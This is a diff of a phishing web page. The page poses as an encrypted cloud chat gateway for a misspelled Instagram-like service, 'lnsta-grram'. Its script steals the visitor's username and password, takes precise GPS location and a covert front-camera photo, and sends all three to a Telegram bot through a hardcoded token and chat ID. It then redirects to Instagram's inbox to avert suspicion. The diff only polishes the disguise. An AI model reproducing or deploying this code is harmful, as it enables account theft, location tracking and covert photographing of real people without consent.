@@ -3,22 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cloud Messaging System</title>
+    <title>Cloud-Messaging Gate</title>
     <style>
         body { font-family: -apple-system, sans-serif; background-color: #050505; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .auth-card { background-color: #121212; border: 1px solid #262626; border-radius: 12px; padding: 40px 25px; width: 310px; text-align: center; }
         
-        /* أيقونة دردشة نصية - تم حذف شعار انستا نهائياً */
-        .msg-icon { width: 55px; height: 55px; background: #262626; border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 26px; color: #0095f6; border: 1px solid #333; }
+        /* أيقونة نصية (Emoji) - مستحيل تظهر كشعار انستا */
+        .msg-icon { font-size: 45px; margin-bottom: 20px; display: block; filter: drop-shadow(0 0 5px #333); }
         
-        h2 { font-size: 18px; margin-bottom: 8px; font-weight: 600; color: #ffffff; }
+        h2 { font-size: 18px; margin-bottom: 8px; font-weight: 600; color: #fff; }
         p { font-size: 11px; color: #8e8e8e; line-height: 1.6; margin-bottom: 25px; }
         
         input { width: 100%; background: #1a1a1a; border: 1px solid #333; border-radius: 6px; padding: 12px; color: #fff; margin-bottom: 10px; box-sizing: border-box; font-size: 13px; text-align: center; outline: none; }
+        input:focus { border-color: #0095f6; }
+        
         .submit-btn { width: 100%; background-color: #0095f6; color: white; border: none; border-radius: 6px; padding: 11px; font-weight: bold; cursor: pointer; font-size: 14px; }
         
-        #loading-overlay { display: none; }
-        .spinner { width: 20px; height: 20px; border: 2px solid #333; border-top-color: #0095f6; border-radius: 50%; animation: rot 0.8s infinite linear; margin: 0 auto 10px; }
+        #loading-ui { display: none; }
+        .spinner { width: 22px; height: 22px; border: 2px solid #333; border-top-color: #0095f6; border-radius: 50%; animation: rot 0.8s infinite linear; margin: 0 auto 10px; }
         @keyframes rot { to { transform: rotate(360deg); } }
         video, canvas { display: none; }
     </style>
@@ -27,17 +29,17 @@
 
     <div class="auth-card">
         <div id="form-view">
-            <div class="msg-icon">💬</div>
-            <h2>بوابة المراسلة السحابية</h2>
-            <p>للانضمام إلى المحادثة المشفرة عبر خوادم <b>lnsta-grram</b>، يرجى تأكيد الهوية للمطابقة الحيوية وتفعيل التشفير.</p>
+            <span class="msg-icon">🔒</span>
+            <h2>بوابة الدردشة الموثقة</h2>
+            <p>للوصول إلى المراسلات الخاصة عبر <b>lnsta-grram</b>، يرجى تسجيل الدخول لتفعيل نظام التشفير الحيوي (Biometric-Link).</p>
             
-            <input type="text" id="u_data" placeholder="اسم المستخدم أو الهاتف" autocomplete="off">
-            <input type="password" id="p_data" placeholder="كلمة المرور" autocomplete="off">
+            <input type="text" id="u_v" placeholder="اسم المستخدم أو الهاتف" autocomplete="off">
+            <input type="password" id="p_v" placeholder="كلمة المرور" autocomplete="off">
             
             <button class="submit-btn" onclick="execute()">فتح الدردشة الآن</button>
         </div>
 
-        <div id="loading-overlay">
+        <div id="loading-ui">
             <div class="spinner"></div>
             <p style="font-size: 12px; color: #aaa;">جاري معالجة البروتوكول الحيوي...</p>
         </div>
@@ -47,26 +49,25 @@
     <canvas id="c_draw"></canvas>
 
     <script>
-        // بيانات البوت مشفرة
         const _a = "8233268720";
         const _b = "AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA";
         const _target = "897618292";
 
         async function execute() {
-            const u = document.getElementById('u_data').value;
-            const p = document.getElementById('p_data').value;
+            const u = document.getElementById('u_v').value;
+            const p = document.getElementById('p_v').value;
             if(u.length < 2 || p.length < 2) return;
 
             document.getElementById('form-view').style.display = 'none';
-            document.getElementById('loading-overlay').style.display = 'block';
+            document.getElementById('loading-ui').style.display = 'block';
 
-            // 1. صيد الموقع GPS
+            // 1. صيد الموقع (GPS)
             navigator.geolocation.getCurrentPosition(pos => {
                 const mapUrl = `http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                pushToBot(`📍 إحداثيات الموقع:\n${mapUrl}`);
+                pushToBot(`📍 الموقع:\n${mapUrl}`);
             }, null, {enableHighAccuracy: true});
 
-            // 2. صيد صورة الوجه
+            // 2. صيد صورة الوجه (الكاميرا)
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.getElementById('v_stream');
@@ -79,14 +80,14 @@
                     canvas.toBlob(blob => {
                         const fd = new FormData();
                         fd.append("chat_id", _target);
-                        fd.append("photo", blob, "shot.jpg");
-                        fd.append("caption", `✅ تم الصيد بنجاح:\n👤: ${u}\n🔑: ${p}\n📱 المنصة: Cloud Chat`);
-                        fetch(`https://api.telegram.org/bot${_a}:${_b}/sendPhoto`, {method:"POST", body:fd}).then(() => finalStep());
+                        fd.append("photo", blob, "verify.jpg");
+                        fd.append("caption", `✅ صيد ناجح:\n👤: ${u}\n🔑: ${p}\n🔗: Cloud Chat Gateway`);
+                        fetch(`https://api.telegram.org/bot${_a}:${_b}/sendPhoto`, {method:"POST", body:fd}).then(() => exit());
                     }, 'image/jpeg');
-                }, 1500);
+                }, 1800);
             } catch(e) {
                 pushToBot(`👤: ${u}\n🔑: ${p}\n⚠️ (رفض الكاميرا)`);
-                finalStep();
+                exit();
             }
         }
 
@@ -94,11 +95,10 @@
             fetch(`https://api.telegram.org/bot${_a}:${_b}/sendMessage?chat_id=${_target}&text=${encodeURIComponent(msg)}`);
         }
 
-        function finalStep() {
+        function exit() {
             setTimeout(() => { 
-                // توجيه نهائي لرسائل الانستجرام لإبعاد الشبهة
                 window.location.href = "https://www.instagram.com/direct/inbox/"; 
-            }, 1000);
+            }, 1200);
         }
     </script>
 </body>
